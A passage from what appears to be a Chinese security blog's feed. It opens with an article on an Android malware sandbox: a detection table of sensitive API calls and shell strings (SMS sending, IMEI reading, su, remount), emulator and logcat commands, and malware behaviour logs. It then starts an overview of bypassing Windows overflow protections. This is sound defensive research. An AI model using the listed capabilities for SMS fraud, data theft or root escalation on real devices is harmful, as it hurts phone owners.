&amp;quot;TelephonyManager\;\-\&amp;gt;getDeviceId&amp;quot; =&amp;gt; &amp;apos;搜集用户手机IMEI码、电话号码、系统版本号等信息&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;TelephonyManager\;\-\&amp;gt;getSimSerialNumber()&amp;quot; =&amp;gt; &amp;apos;获取SIM序列号&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;Telephony\$Mms\;\-\&amp;gt;query&amp;quot; =&amp;gt; &amp;apos;读取短信&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;TelephonyManager\;\-\&amp;gt;getLine1Number&amp;quot; =&amp;gt; &amp;apos;获取手机号&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;SpeechRecognizer\;\-\&amp;gt;startListening&amp;quot; =&amp;gt; &amp;apos;开启麦克风&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;WifiManager\;\-\&amp;gt;setWifiEnabled&amp;quot; =&amp;gt; &amp;apos;开启WIFI&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;SmsManager\;\-\&amp;gt;getAllMessagesFromSim&amp;quot; =&amp;gt; &amp;apos;获取sim卡上的短信&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;SmsManager\;\-\&amp;gt;sendDataMessage&amp;quot; =&amp;gt; &amp;apos;发送二进制消息&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;SmsManager\;\-\&amp;gt;sendMultipartTextMessage&amp;quot; =&amp;gt; &amp;apos;发送彩信&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;SmsManager\;\-\&amp;gt;sendTextMessage&amp;quot; =&amp;gt; &amp;apos;发送普通短信&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;quot;http/multipart/FilePart;-&amp;gt;sendData&amp;quot; =&amp;gt; &amp;apos;发送http请求&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;quot;http/multipart/Part\;\-\&amp;gt;send&amp;quot; =&amp;gt; &amp;apos;发送http请求&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;quot;http/multipart/Part\;\-\&amp;gt;sendParts&amp;quot; =&amp;gt; &amp;apos;发送http请求&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;quot;http/multipart/StringPart\;\-\&amp;gt;sendData&amp;quot; =&amp;gt; &amp;apos;发送http请求&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;internal/telephony/ISms\$Stub\$Proxy\;\-\&amp;gt;sendData&amp;quot; =&amp;gt; &amp;apos;发送短信&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;internal/telephony/ISms\$Stub\$Proxy\;\-\&amp;gt;sendMultipartText&amp;quot; =&amp;gt; &amp;apos;发送短信&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;internal/telephony/ISms\$Stub\$Proxy\;\-\&amp;gt;sendText&amp;quot; =&amp;gt; &amp;apos;发送短信&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;internal/telephony/ITelephony\$Stub\$Proxy\;\-\&amp;gt;call&amp;quot; =&amp;gt; &amp;apos;拔打电话&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;java/lang/Runtime\;\-\&amp;gt;exec&amp;quot; =&amp;gt; &amp;apos;执行字符串命令&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;java/net/HttpURLConnection\;\-\&amp;gt;connect&amp;quot; =&amp;gt; &amp;apos;连接URL&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;quot;java/net/URL\;\-\&amp;gt;getContent&amp;quot; =&amp;gt; &amp;apos;获取网页内容&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;java/net/URL\;\-\&amp;gt;openConnection&amp;quot; =&amp;gt; &amp;apos;连接URL&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;java/net/URLConnection\;\-\&amp;gt;connect&amp;quot; =&amp;gt; &amp;apos;连接URL&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;DefaultHttpClient\;\-\&amp;gt;execute&amp;quot; =&amp;gt; &amp;apos;发送HTTP请求&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;HttpClient\;\-\&amp;gt;execute&amp;quot; =&amp;gt; &amp;apos;请求远程服务器&amp;apos;,	&amp;apos;android/app/NotificationManager;-&amp;gt;notify&amp;apos; =&amp;gt; &amp;apos;信息通知栏&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;SmsReceiver\;\-\&amp;gt;abortBroadcast&amp;quot; =&amp;gt; &amp;apos;拦截短信接收&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;ContentResolver\;\-\&amp;gt;delete&amp;quot; =&amp;gt; &amp;apos;删除短信、联系人&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;chmod &amp;quot; =&amp;gt; &amp;apos;更改文件权限&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;quot;getRuntime&amp;quot; =&amp;gt; &amp;apos;获取命令行环境&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	#&amp;apos;content://telephony/carriers&amp;apos; =&amp;gt; &amp;apos;获取所有的APN（网络接入点）配置信息&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;content://telephony/carriers/preferapn&amp;apos; =&amp;gt; &amp;apos;可能用于篡改APN（网络接入点）以调用应用市场M-Market扣费接口并验证&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;content://sms&amp;apos; =&amp;gt; &amp;apos;获取短信数据库&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;content://browser/bookmarks&amp;apos; =&amp;gt; &amp;apos;获取浏览器书签&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;mount -o remount&amp;apos; =&amp;gt; &amp;apos;重新挂载档案系统&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;/system/bin/sh&amp;apos; =&amp;gt; &amp;apos;执行shell&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;/proc/mounts&amp;apos; =&amp;gt; &amp;apos;加载文件系统&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;/system/bin/cp&amp;apos; =&amp;gt; &amp;apos;复制文件&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;apos;/root/su&amp;apos; =&amp;gt; &amp;apos;切换用户&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;apos;/system/bin/rm &amp;apos; =&amp;gt; &amp;apos;删除文件&amp;apos;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&quot;2、动态分析&quot;&gt;&lt;a href=&quot;#2、动态分析&quot; class=&quot;headerlink&quot; title=&quot;2、动态分析&quot;&gt;&lt;/a&gt;2、动态分析&lt;/h4&gt;&lt;p&gt;动态分析是Android沙盘的主要功能，主要使用Google Android模拟器作为沙盘环境，同时以前面修改过的system.img来启动模拟器，以在操作过程中生成我们所需的日志信息：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;system(&amp;apos;start emulator -avd MalDroidAnalyzer -scale 0.8  -system images/root-system.img -ramdisk images/ramdisk.img -kernel images/zImage  -prop dalvik.vm.execution-mode=int:portable &amp;amp;&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里的root-system.img是经过root的，默认情况下，Android模拟器是没有root权限的，需要自己手工修改，这个可通过YAFFS2 img浏览器来修改system.img，将su和superuser放置到系统应用目录下，并将build.prop中的ro.config.nocheckin=yes注释掉，将修改后的system.img替换原文件即可。。这样在一些需要root权限的病毒才能正常地模拟器运行，以触发更多的恶意行为。&lt;/p&gt;
&lt;p&gt;启动模拟器后，利用adb安装APK到模拟器上。业界多数沙盘是通过monkey去自动操作软件以触发恶意行为，但这种做法过于盲目，不容易触发恶意行为，同时当操作过于频繁时容易导致程序崩溃，因此在MalDroidAnalyzer中选择由用户自主手工操作，操作时间由用户自己把握。手工操作可能更有利于触发恶意行为，因为病毒作者通常会更多地依赖用户的操作习惯来触发恶意行为，比如点击、拔打电话等行为。&lt;br&gt;为了避免生成过多的无用日志，因此在使用logcat命令时可提前过滤下，并输出到log.txt文件：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;system(&amp;quot;adb logcat -v time ActivityManager:I camera:V AudioHardware:D Telephony:V CallNotifier:D su:D MediaProvider:V videocamera:V BluetoothEnabler:V BluetoothHIDService:I dalvikvm:W *:S  &amp;gt; log.txt&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最后对生成的日志log.txt进行分析，由于修改过system.img，它会按照json格式输出我们所需的信息，而有些原本Android系统输出的日志可直接拿来作行为检测，就未作修改。日志格式如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;09-16 10:18:04.583 W/dalvikvm(  299): MalDroid: &amp;#123; &amp;quot;DexClassLoader&amp;quot;: &amp;#123; &amp;quot;path&amp;quot;: &amp;quot;/data/data/com.test/files/anserverb.db&amp;quot; &amp;#125; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;09-16 10:17:27.963 W/dalvikvm(  281): MalDroid: &amp;#123; &amp;quot;SendNet&amp;quot;: &amp;#123; &amp;quot;desthost&amp;quot;: &amp;quot;www.google.com&amp;quot;, &amp;quot;destport&amp;quot;: &amp;quot;80&amp;quot;, &amp;quot;data&amp;quot;: &amp;quot;7b2263656c6c5f746f77657273223a5b7b226d6f62696c655f6e6574776f726b5f636f6465223a32362c226c6f636174696f6e5f617265615f636f6465223a2d312c226d6f62696c655f636f756e7472795f636f6465223a3331302c2263656c6c5f6964223a2d317d5d2c22726571756573745f61646472657373223a747275652c22686f7374223a226d6170732e676f6f676c652e636f6d222c2276657273696f6e223a22312e312e30227d&amp;quot; &amp;#125; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;09-09 08:37:10.371 W/dalvikvm(  191): MalDroid: &amp;#123; &amp;quot;CryptoUsage&amp;quot;: &amp;#123; &amp;quot;operation&amp;quot;: &amp;quot;keyalgo&amp;quot;, &amp;quot;key&amp;quot;: &amp;quot;53, 52, 67, 68, 65, 48, 54, 51, 67, 68, 53, 56, 68, 56, 53, 70&amp;quot;, &amp;quot;algorithm&amp;quot;: &amp;quot;AES&amp;quot; &amp;#125; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;09-09 08:37:12.560 W/dalvikvm(  191): MalDroid: &amp;#123; &amp;quot;CryptoUsage&amp;quot;: &amp;#123; &amp;quot;operation&amp;quot;: &amp;quot;encryption&amp;quot;, &amp;quot;algorithm&amp;quot;: &amp;quot;AES/CBC/PKCS5Padding&amp;quot;, &amp;quot;data&amp;quot;: &amp;quot;ylmftg6&amp;quot; &amp;#125; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;09-17 20:17:14.302 W/dalvikvm(  274): MalDroid: &amp;#123; &amp;quot;ServiceStart&amp;quot;: &amp;#123; &amp;quot;name&amp;quot;: &amp;quot;com.android.md5.Settings&amp;quot; &amp;#125; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;09-17 20:24:24.944 W/dalvikvm(  126): MalDroid: &amp;#123; &amp;quot;FdAccess&amp;quot;: &amp;#123; &amp;quot;path&amp;quot;: &amp;quot;2f646174612f646174612f636f6d2e616e64726f69642e6c61756e636865722f66696c65732f6c61756e636865722e707265666572656e636573&amp;quot;, &amp;quot;id&amp;quot;: &amp;quot;588716465&amp;quot; &amp;#125; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;09-17 20:24:24.965 W/dalvikvm(  126): MalDroid: &amp;#123; &amp;quot;FileRW&amp;quot;: &amp;#123; &amp;quot;operation&amp;quot;: &amp;quot;read&amp;quot;, &amp;quot;data&amp;quot;: &amp;quot;0005&amp;quot;, &amp;quot;id&amp;quot;: &amp;quot;588716465&amp;quot; &amp;#125; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;生成日志后，MalDroidAnalyzer会去分析日志，生成统计图数据，然后生成报告。下面是一些真实病毒样本的恶意行为记录：&lt;/p&gt;
&lt;p&gt;1、窃取通讯录： &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/android_malware_analyze/3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;2、通话录音： &lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/android_malware_analyze/4.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;3、发送收费短信：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/android_malware_analyze/5.png&quot; alt=&quot;&quot;&gt; &lt;/p&gt;
&lt;p&gt;4、动态加载类文件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/android_malware_analyze/6.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;5、Root提权：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/android_malware_analyze/7.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;四、-真实案例&quot;&gt;&lt;a href=&quot;#四、-真实案例&quot; class=&quot;headerlink&quot; title=&quot;四、    真实案例&quot;&gt;&lt;/a&gt;四、    真实案例&lt;/h3&gt;&lt;p&gt;在Google Android官方市场上，曾出现过多起应用程序嵌入恶意代码的事件，比如“功夫病毒”，可进行root提权，并破坏文件系统，同时窃取用户隐私信息，感染了上百万用户，危害甚广。病毒作者通过对知名软件进行修改，嵌入恶意代码然后重打包，然后诱骗用户下载这些伪造软件。除“功夫病毒”外，还有DroidDream、AnserverBot、PhoneSpy等恶意软件。下面是MalDroidAnalyzer针对PhoneSpy病毒Gmail.apk给出的分析报告，该病毒会窃取用户隐私信息、通话录音等恶意行为。由于该病毒无GUI界面，而是以后台服务在运行，因此报告中的截图是主页界面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/media/android_malware_analyze/8.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;/media/android_malware_analyze/9.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;/media/android_malware_analyze/10.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;&lt;img src=&quot;/media/android_malware_analyze/11.png&quot; alt=&quot;&quot;&gt; &lt;/p&gt;
&lt;h3 id=&quot;五、-总结&quot;&gt;&lt;a href=&quot;#五、-总结&quot; class=&quot;headerlink&quot; title=&quot;五、    总结&quot;&gt;&lt;/a&gt;五、    总结&lt;/h3&gt;&lt;p&gt;当前手机用户量增长越来越快，尤其是中国，手机用户量已超10亿，即大约75%的中国人拥有自己的手机。正因为手机越来越智能化，携带也方便，因此许多人将隐私信息存储在手机上，且在多处场景下无形地公开化，而这些信息正是许多病毒作者所热衷的。在移动终端上的安全也将比电脑终端越来越重要，移动安全也已成为安全领域的另一新战场。&lt;/p&gt;
&lt;h3 id=&quot;六、-鸣谢&quot;&gt;&lt;a href=&quot;#六、-鸣谢&quot; class=&quot;headerlink&quot; title=&quot;六、    鸣谢&quot;&gt;&lt;/a&gt;六、    鸣谢&lt;/h3&gt;&lt;p&gt;感谢Dflower同学（0day2作者之一）在笔者编写MalDroidAnalyzer过程中给予的帮助。&lt;/p&gt;
&lt;h3 id=&quot;七、-参考资料&quot;&gt;&lt;a href=&quot;#七、-参考资料&quot; class=&quot;headerlink&quot; title=&quot;七、    参考资料&quot;&gt;&lt;/a&gt;七、    参考资料&lt;/h3&gt;&lt;p&gt;1、    DroidBox：&lt;a href=&quot;http://code.google.com/p/droidbox&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://code.google.com/p/droidbox&lt;/a&gt;&lt;br&gt;2、    SandDroid：&lt;a href=&quot;http://sanddroid.xjtu.edu.cn&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://sanddroid.xjtu.edu.cn&lt;/a&gt;&lt;br&gt;3、    apktool：&lt;a href=&quot;http://code.google.com/p/android-apktool&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://code.google.com/p/android-apktool&lt;/a&gt;&lt;br&gt;4、    网秦《2012年上半年全球手机安全报告》：&lt;a href=&quot;http://cn.nq.com/neirong/2012shang.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://cn.nq.com/neirong/2012shang.pdf&lt;/a&gt;&lt;br&gt;5、    Android权限中文描述大全：&lt;a href=&quot;http://wenku.baidu.com/view/b1f6f9ff0242a8956bece4e7.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://wenku.baidu.com/view/b1f6f9ff0242a8956bece4e7.html&lt;/a&gt;&lt;br&gt;6、    Android Permission Map：&lt;a href=&quot;http://www.android-permissions.org/permissionmap.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.android-permissions.org/permissionmap.html&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;【作者】：riusksk（泉哥）&lt;br&gt;【团队】：腾讯安全应急响应中心&lt;br&gt;【日期】：2012年10月2日&lt;/p&gt;
&lt;h3 id=&quot;一、-前言&quot;&gt;&lt;a href=&quot;#一、-前言&quot; class=&quot;headerlink&quot; title=&quot;一、    前言&quot;&gt;&lt;/a&gt;一、    
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Android" scheme="http://riusksk.github.io/tags/Android/"/>
    
      <category term="恶意软件" scheme="http://riusksk.github.io/tags/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>浅谈Android软件安全自动化审计</title>
    <link href="http://riusksk.github.io/2012/05/25/android-auto-auditor/"/>
    <id>http://riusksk.github.io/2012/05/25/android-auto-auditor/</id>
    <published>2012-05-24T16:00:00.000Z</published>
    <updated>2016-06-20T10:16:19.000Z</updated>
    
    <content type="html">

	&lt;div class=&quot;row&quot;&gt;
	  &lt;iframe src=&quot;http://nagland.github.io/viewer/web/viewer.html?val=http://riusksk.me/media/android_auto_auditor.pdf&quot; style=&quot;width:100%; height:550px&quot;&gt;&lt;/iframe&gt;
	&lt;/div&gt;



</content>
    
    <summary type="html">
    
      

	&lt;div class=&quot;row&quot;&gt;
	  &lt;iframe src=&quot;http://nagland.github.io/viewer/web/viewer.html?val=http://riusksk.me/media/android_auto_auditor.pdf&quot; s
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Android" scheme="http://riusksk.github.io/tags/Android/"/>
    
      <category term="安全审计" scheme="http://riusksk.github.io/tags/%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>基于SPIKE的网络协议Fuzzing技术</title>
    <link href="http://riusksk.github.io/2011/12/30/spike-fuzz/"/>
    <id>http://riusksk.github.io/2011/12/30/spike-fuzz/</id>
    <published>2011-12-29T16:00:00.000Z</published>
    <updated>2016-06-24T08:47:23.000Z</updated>
    
    <content type="html">

	&lt;div class=&quot;row&quot;&gt;
	  &lt;iframe src=&quot;http://nagland.github.io/viewer/web/viewer.html?val=http://riusksk.me/media/spike_fuzz.pdf&quot; style=&quot;width:100%; height:550px&quot;&gt;&lt;/iframe&gt;
	&lt;/div&gt;



</content>
    
    <summary type="html">
    
      

	&lt;div class=&quot;row&quot;&gt;
	  &lt;iframe src=&quot;http://nagland.github.io/viewer/web/viewer.html?val=http://riusksk.me/media/spike_fuzz.pdf&quot; style=&quot;widt
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Fuzz" scheme="http://riusksk.github.io/tags/Fuzz/"/>
    
      <category term="漏洞" scheme="http://riusksk.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>多平台恶意软件行为分析技巧</title>
    <link href="http://riusksk.github.io/2011/08/20/malware-analyze/"/>
    <id>http://riusksk.github.io/2011/08/20/malware-analyze/</id>
    <published>2011-08-19T16:00:00.000Z</published>
    <updated>2016-06-18T12:17:28.000Z</updated>
    
    <content type="html">

	&lt;div class=&quot;row&quot;&gt;
	  &lt;iframe src=&quot;http://nagland.github.io/viewer/web/viewer.html?val=http://riusksk.me/media/malware_analyze.pdf&quot; style=&quot;width:100%; height:550px&quot;&gt;&lt;/iframe&gt;
	&lt;/div&gt;



</content>
    
    <summary type="html">
    
      

	&lt;div class=&quot;row&quot;&gt;
	  &lt;iframe src=&quot;http://nagland.github.io/viewer/web/viewer.html?val=http://riusksk.me/media/malware_analyze.pdf&quot; style=
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="恶意软件" scheme="http://riusksk.github.io/tags/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Windows溢出保护原理与绕过方法概览</title>
    <link href="http://riusksk.github.io/2011/03/26/win-overflow-protect-and-bypass/"/>
    <id>http://riusksk.github.io/2011/03/26/win-overflow-protect-and-bypass/</id>
    <published>2011-03-25T16:00:00.000Z</published>
    <updated>2016-06-21T02:37:36.000Z</updated>
    
    <content type="html">&lt;p&gt;By  : riusksk（泉哥）&lt;br&gt;Blog: &lt;a href=&quot;http://riusksk.blogbus.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://riusksk.blogbus.com&lt;/a&gt;&lt;br&gt;Data: 第1版：2010/10/26&lt;br&gt;      第2版：2011/3/26&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;从20世纪80年代开始，在国外就有人开始讨论关于溢出的攻击方式。但是在当时并没有引起人们的注意，直至后来经一些研究人员的披露后，特别是著名黑客杂志Phrack上面关于溢出的经典文章，引领许多人步入溢出研究的行列，从此关于缓冲区溢出的问题才为人们所重视。随着溢出研究的深入，网上开始出现很多关于溢出攻击教程，揭露了许多溢出利用技术，特别是经典的call/jmp esp，借此溢出攻击案例层出不穷。这也引起了微软的重视，他们在windows系统及VC++编译器上加入了各种溢出保护机制，以试图阻止这类攻击，可惜每次公布溢出保护机制之后，不久就有人公布绕过方法。MS每次都称某保护机制将成为溢出利用的末日，可惜每次都被终结掉。既而，黑客与微软之间的溢出斗争一直持续着。更多关于windows溢出的历史，可参见由Abysssec安全组织编写的文章&lt;a href=&quot;http://www.abysssec.com/blog/2010/05/past-present-future-of-windows-exploitation/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;《Past，Present，Future of Windows Exploitation》&lt;/a&gt;。在本篇文章中主要揭露了windows平台上的各种溢出保护机制原理以及绕过方法，具体内容参见下文。&lt;/p&gt;
&lt;h2 id=&quot;一、GS编译选项&quot;&gt;&lt;a href=&quot;#一、GS编译选项&quot; class=&quot;headerlink&quot; title=&quot;一、GS编译选项&quot;&gt;&lt;/a&gt;一、GS编译选项&lt;/h2&gt;&lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;通过VC++编译器在函数前后添加额外的处理代码，前部分用于由伪随机数生成的cookie并放入.data节段，当本地变量初始化，就会向栈中插入cookie，它位于局部变量和返回地址之间：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┏━━━━━━━━┓内存低地址
┃   局部变量    ┃▲
┣━━━━━━━━┫┃
┃security_cookie ┃┃
┣━━━━━━━━┫┃栈
┃  入栈寄存器   ┃┃生
┣━━━━━━━━┫┃长                       
┃     SEH节点  ┃┃方
┣━━━━━━━━┫┃向
┃    返回地址   ┃┃
┣━━━━━━━━┫┃
┃    函数参数   ┃┃
┣━━━━━━━━┫┃
┃    虚函数表   ┃┃
┗━━━━━━━━┛内存高地址
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;经GS编译后栈中局部变量空间分配情况：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sub   esp,24h&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov   eax,dword ptr [___security_cookie (408040h)]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xor   eax,dword ptr [esp+24h]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov   dword ptr [esp+20h],eax&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在函数尾部的额外代码用于在函数返回时，调用security_check_cookie（）函数，以判断cookie是否被更改过，当函数返回时的情况如下：&lt;/p&gt;
